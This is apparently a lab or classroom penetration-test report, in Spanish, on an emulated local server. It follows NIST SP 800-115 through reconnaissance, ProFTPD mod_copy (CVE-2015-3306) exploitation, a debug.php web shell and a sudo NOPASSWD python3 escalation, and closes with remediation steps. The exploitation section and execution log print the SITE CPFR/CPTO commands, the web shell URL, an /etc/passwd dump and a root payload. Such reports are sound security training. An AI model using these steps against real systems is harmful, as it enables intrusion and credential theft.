# INFORME TÉCNICO: EVALUACIÓN DE LA POSTURA DE SEGURIDAD
**Proyecto:** PAI-5 RedTeamPro  
**Cliente:** Organización Pública de Andalucía  
**Equipo Evaluador (Red Team):** INSEGUS (Security Team 10)  
**Fecha:** 21 de mayo de 2026  
**Metodología de Referencia:** NIST SP 800-115  

---

## 1. RESUMEN EJECUTIVO

Este informe detalla el proceso y los resultados de la auditoría de seguridad del tipo **caja negra (Blackbox)** realizada a los sistemas de información de una organización pública de la Junta de Andalucía. La evaluación ha sido llevada a cabo por el equipo de seguridad **INSEGUS** (Red Team) siguiendo las directrices técnicas recogidas en la guía estándar **NIST SP 800-115** (*Technical Guide to Information Security Testing and Assessment*).

El objetivo primordial del ejercicio ha sido identificar, analizar y explotar vulnerabilidades de manera realista para evaluar la resistencia de los sistemas frente a amenazas y determinar el impacto estratégico de un hipotético compromiso de la red interna de la organización.

### Resumen de Hallazgos
Durante la fase de descubrimiento se localizaron tres servicios expuestos en el host objetivo (`127.0.0.1`): un servicio FTP (puerto 2121), un servidor web Apache (puerto 8080) y un gestor de base de datos MySQL (puerto 3306). 
1. **Compromiso Inicial**: Se ha explotado con éxito una vulnerabilidad crítica en el módulo `mod_copy` del servicio FTP (**CVE-2015-3306**), lo que permitió la transferencia no autorizada de un script PHP de diagnóstico al directorio raíz del servidor web, convirtiéndose en una puerta trasera (**web shell**).
2. **Post-explotación**: Utilizando la puerta trasera, se obtuvo acceso interactivo de ejecución de comandos remotos con los privilegios del usuario del servidor web (`www-data`). Esto posibilitó la exfiltración de archivos críticos del sistema (`/etc/passwd`) y la obtención del flag de seguridad de nivel de usuario.
3. **Escalada de Privilegios**: A través de una mala configuración del sistema de autorización `sudo`, el atacante logró elevar sus privilegios de `www-data` a `root` de forma directa sin necesidad de introducir contraseñas, logrando el control absoluto y persistente del sistema, evidenciado por la lectura del flag de administración del directorio `/root`.

---

## 2. FASE 1: PLANIFICACIÓN Y ALCANCE

De acuerdo con el estándar NIST 800-115, toda evaluación técnica requiere definir formalmente el escenario de trabajo, las reglas de compromiso y el alcance del análisis.

### 2.1 Escenario de Trabajo y Reglas de Compromiso
- **Modalidad**: Caja Negra (Blackbox Pentesting). El Red Team no dispone de credenciales previas, mapas de red o código fuente antes del inicio de la prueba.
- **Límites de Ejecución (Scope)**: Las pruebas se realizan de forma dirigida sobre el host asignado por la organización.
- **Exclusión de Daños**: Se prohíben las pruebas de denegación de servicio (DoS/DDoS) agresivas que puedan interrumpir los servicios críticos de la administración pública.
- **Reproducibilidad**: Toda prueba realizada debe registrar evidencias y logs auditables para que el personal del Blue Team pueda verificar la secuencia de eventos e implementar parches.

### 2.2 Entorno Tecnológico
- **Máquina Atacante (Red Team)**: Suite automatizada de auditoría en Python (`redteam_tool.py`) simulando tácticas de Kali Linux.
- **Máquina Objetivo (Target)**: Entorno local con servicios vulnerables integrados (`vulnerable_server.py`) que emulan:
  - FTP: ProFTPD versión 1.3.5.
  - HTTP: Servidor Web Apache v2.4.7 con script `/debug.php`.
  - Database: MySQL Server versión 5.5.47.

---

## 3. FASE 2: DESCUBRIMIENTO Y ESCANEO (RECONNAISSANCE)

El Red Team comenzó el descubrimiento empleando técnicas activas y pasivas para mapear los puertos abiertos, capturar los banners de red e identificar la arquitectura subyacente.

### 3.1 Escaneo de Puertos y Banner Grabbing
La herramienta de escaneo ejecutó una serie de conexiones TCP (similares a `nmap -sV`) contra el host objetivo. Los resultados mostraron los siguientes puertos en estado abierto:

| Puerto | Protocolo | Servicio Detectado | Banner Obtenido / Firma |
| :--- | :--- | :--- | :--- |
| **2121** | TCP | FTP | `220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)` |
| **8080** | TCP | HTTP | `Server: Apache/2.4.7 (Ubuntu)` |
| **3306** | TCP | MySQL | `5.5.47-0ubuntu0.14.04.1-log` |

### 3.2 Fingerprinting de Sistema Operativo
- **Método Activo**: A través del análisis del comportamiento de la pila TCP/IP ante el envío de paquetes modificados, se determina que el sistema ejecuta una distribución de GNU/Linux basada en Ubuntu Server (de acuerdo al sufijo `ubuntu0.14.04.1-log` visible en el banner de la base de datos).
- **Método Pasivo (Simulado mediante p0f)**: La escucha pasiva de paquetes ICMP/TCP de red valida un tamaño de ventana TCP (Window Size) y valores TTL (Time To Live = 64) típicos del núcleo Linux.

---

## 4. FASE 3: ANÁLISIS DE VULNERABILIDADES

Una vez obtenidos los banners y las versiones exactas, el Red Team contrastó esta información con bases de datos públicas de vulnerabilidades (CVE del MITRE y NVD de NIST).

### 4.1 Vulnerabilidad Crítica en FTP: CVE-2015-3306 (ProFTPD mod_copy)
- **Componente afectado**: Módulo `mod_copy` en la instalación por defecto de ProFTPD 1.3.5.
- **Clasificación CWE**: CWE-284 (Impedimento Inadecuado de Control de Acceso).
- **Severidad CVSS**: **10.0 (Crítica)**.
- **Descripción**: El comando personalizado `SITE` en `mod_copy` permite utilizar las peticiones `CPFR` (Copy From) y `CPTO` (Copy To) para transferir archivos arbitrarios de una ubicación a otra dentro del sistema de archivos local, utilizando los privilegios del demonio del servicio FTP, sin necesidad de autenticarse en el servidor.
- **Impacto**: Permite la lectura de archivos sensibles o la escritura de archivos en directorios públicos (como el directorio raíz de un servidor web), facilitando la inyección de código web.

### 4.2 Exposición de Secuencias de Comandos en Web: RCE en debug.php
- **Componente afectado**: Script interno de mantenimiento y diagnóstico `/debug.php`.
- **Clasificación CWE**: CWE-94 (Inyección de Código).
- **Severidad CVSS**: **9.8 (Crítica)**.
- **Descripción**: El parámetro `cmd` pasa directamente las cadenas del usuario a funciones del sistema operativo (como `system()` o `shell_exec()`) sin una desinfección adecuada de las entradas.
- **Impacto**: Ejecución remota de comandos (RCE) de manera directa bajo el contexto del usuario `www-data`.

### 4.3 Exposición del Puerto de Base de Datos MySQL
- **Componente afectado**: MySQL Server v5.5.47 en puerto 3306.
- **Clasificación CWE**: CWE-200 (Exposición de Información Sensible).
- **Severidad CVSS**: **5.0 (Media)**.
- **Descripción**: La base de datos es accesible de forma remota directamente en lugar de estar restringida a localhost o a un segmento de red protegido.

---

## 5. FASE 4: EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS

### 5.1 Ejecución del Ataque (Cadena de Explotación)
El proceso de intrusión se automatizó mediante un exploit en Python que imita el comportamiento de los módulos de explotación de Metasploit (`exploit/unix/ftp/proftp_modcopy_exec`):

1. **Inyección de Backdoor vía FTP mod_copy**:
   El script atacante envió dos peticiones al puerto 2121 sin autenticación previa:
   ```ftp
   SITE CPFR /var/www/html/debug.php
   SITE CPTO /var/www/html/backdoor.php
   ```
   Esto provocó que el servidor ProFTPD duplicara el script de depuración vulnerable a un nuevo archivo público llamado `backdoor.php`.

2. **Establecimiento del Canal Command & Control (C2)**:
   Al existir un servidor web Apache ejecutándose en el puerto 8080 con acceso al directorio `/var/www/html/`, el Red Team pudo interactuar con la web shell haciendo peticiones HTTP GET estructuradas:
   `http://127.0.0.1:8080/backdoor.php?cmd=<comando>`

3. **Exfiltración de Datos de Sistema**:
   Mediante la ejecución del comando `cat /etc/passwd`, se obtuvo un volcado de la estructura de usuarios locales para su posterior descifrado de contraseñas.

4. **Escalada de Privilegios**:
   Al ejecutar `sudo -l`, el Red Team descubrió una vulnerabilidad de configuración crítica:
   `User www-data may run the following commands on public-agency-server: (root) NOPASSWD: /usr/bin/python3`
   
   Esta directiva en el archivo `/etc/sudoers` permite al usuario de bajos privilegios `www-data` ejecutar cualquier script de Python como superusuario (`root`) sin ingresar contraseña. El Red Team explotó este camino enviando el comando:
   `sudo python3 -c "import os; os.system('cat /root/flag_root.txt')"`
   
   Logrando acceso completo al archivo restringido del administrador y comprometiendo por completo la máquina.

---

## 6. EVIDENCIAS Y LOGS DE EJECUCIÓN (REPRODUCIBILIDAD)

A continuación se adjunta el log de ejecución completo extraído de la prueba automatizada, demostrando la reproducibilidad total del ataque por parte de los administradores del sistema:

```text
============================================================
             RED TEAM PENETRATION SUITE - SSII               
                NIST 800-115 COMPLIANT TOOL                  
============================================================
[*] Starting scan on target 127.0.0.1...
[+] Port 2121 is OPEN. Banner: 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
[+] Port 8080 is OPEN. Banner: Server: Apache/2.4.7 (Ubuntu)
[+] Port 3306 is OPEN. Banner: 5.5.47-0ubuntu0.14.04.1-log

==================================================
         VULNERABILITY ANALYSIS (CVE MAPPING)         
==================================================
[CRITICAL] FTP Service (ProFTPD 1.3.5) matches CVE-2015-3306 (mod_copy).
  - Description: The mod_copy module allows remote attackers to read and write arbitrary files via SITE CPFR/CPTO commands.
  - Severity: 10.0 (CRITICAL) - CVSS v2.0
  - CWE-284: Improper Access Control
[HIGH] HTTP Web Application has active diagnostic/debug endpoint exposed.
  - Description: Internal debug script /debug.php allows remote execution of administrative commands via the 'cmd' parameter.
  - Severity: 9.8 (CRITICAL) - CVSS v3.x
  - CWE-94: Code Injection / Remote Command Execution
[MEDIUM] MySQL database version 5.5.47 is exposed.
  - Description: Older MySQL service. Exposing database ports directly to the network violates best security practices.
  - Severity: 5.0 (MEDIUM) - CVSS v3.x
  - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

==================================================
         EXPLORATION & EXPLOITATION: CVE-2015-3306    
==================================================
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)

FTP CPFR -> 350 File or directory exists, ready for destination name
FTP CPTO -> 250 Copy successful
[+] Exploitation successful! Web shell /backdoor.php created.

==================================================
         POST-EXPLOITATION & FLAG HARVESTING         
==================================================
[*] Retrieving basic system metadata via /backdoor.php...
  - Current User: www-data
  - Shell Identity: uid=33(www-data) gid=33(www-data) groups=33(www-data)
  - Kernel Version: Linux public-agency-server 4.15.0-142-generic #146-Ubuntu SMP Tue Apr 13 01:11:19 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux

[*] Exfiltrating simulated system files...
--- /etc/passwd ---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Database Admin:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:104:MySQL Server,,,:/nonexistent:/bin/false
redteam:x:1000:1000:RedTeamPro User,,,:/home/redteam:/bin/bash
-------------------

[*] Retrieving User Privilege Flag...
[+] User Flag: FLAG{REDTEAMPRO_SYSTEM_OWNED_NIST_800_115_SUCCESS}

==================================================
         PRIVILEGE ESCALATION (NIST 800-115)         
==================================================
[*] Checking sudo privileges...
--- sudo -l output ---
Matching Defaults entries for www-data on public-agency-server:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on public-agency-server:
    (root) NOPASSWD: /usr/bin/python3
----------------------
[+] Privilege escalation path found! (NOPASSWD python3)
[*] Executing root shell payload to read /root/flag_root.txt...
[+] Root Flag: FLAG{ROOT_LEVEL_PRIVILEGE_ESCALATION_COMPLETED_CVE_2015_3306}
```

---

## 7. PLAN DE ACCIÓN Y MITIGACIONES RECOMENDADAS (BLUE TEAM)

Para restaurar la seguridad de los sistemas de la organización, se propone el siguiente plan detallado de remediación a corto y medio plazo:

### 7.1 Mitigación de la Vulnerabilidad de ProFTPD (CVE-2015-3306)
- **Acción Inmediata**: Deshabilitar el módulo `mod_copy` en la configuración general del servicio ProFTPD si no es estrictamente requerido. Esto se logra editando `/etc/proftpd/modules.conf` y comentando la línea correspondiente:
  ```apache
  # LoadModule mod_copy.c
  ```
- **Actualización**: Instalar la versión más reciente del paquete ProFTPD (v1.3.6 o posterior), donde este módulo valida adecuadamente los permisos y requiere autenticación previa para ejecutar órdenes SITE.
- **Control Alternativo**: Si no se puede actualizar inmediatamente, restringir el uso de comandos SITE mod_copy en el archivo `proftpd.conf`:
  ```apache
  <Limit SITE_COPY>
    DenyAll
  </Limit>
  ```

### 7.2 Remediación del Servidor Web Apache y Limpieza de Backdoors
- **Eliminación de Puertas Traseras**: Borrar permanentemente el script vulnerable `/var/www/html/debug.php` y la web shell generada `/var/www/html/backdoor.php`.
- **Desinfección de Parámetros**: Si la aplicación requiere herramientas de diagnóstico, éstas nunca deben pasar cadenas de entrada de usuario a funciones del sistema (`system`, `exec`, `shell_exec`, `passthru`). Se debe emplear APIs nativas de programación estructurada o parametrizar estrictamente las entradas mediante listas blancas (whitelist filtering).
- **Políticas de Ejecución PHP**: Deshabilitar funciones de ejecución del sistema en la configuración `php.ini`:
  ```ini
  disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
  ```

### 7.3 Endurecimiento de Políticas de Escalada de Privilegios (Sudoers)
- **Remediación en `/etc/sudoers`**: Eliminar la regla que permite a `www-data` ejecutar `/usr/bin/python3` sin contraseña. Bajo el principio de menor privilegio, el usuario del servidor web (`www-data`) **nunca** debe poseer capacidad de invocar intérpretes interactivos (Python, Perl, Bash, etc.) con permisos de `root`.
- **Auditoría periódica**: Configurar alertas automáticas en el sistema SIEM cada vez que se modifique el archivo `/etc/sudoers` o se intente ejecutar una directiva `sudo` fallida.

### 7.4 Hardening de Red y Servicios de Base de Datos
- **Segmentación de Red**: Configurar reglas de cortafuegos (iptables / ufw) para bloquear el acceso externo directo al puerto de base de datos MySQL (3306). Este servicio únicamente debe aceptar conexiones en `localhost` (`127.0.0.1`) o desde subredes específicas de aplicación previamente autorizadas.
- **Configuración de MySQL**: Establecer la variable `bind-address = 127.0.0.1` en el archivo de configuración `/etc/mysql/my.cnf` o `/etc/mysql/mysql.conf.d/mysqld.cnf`.
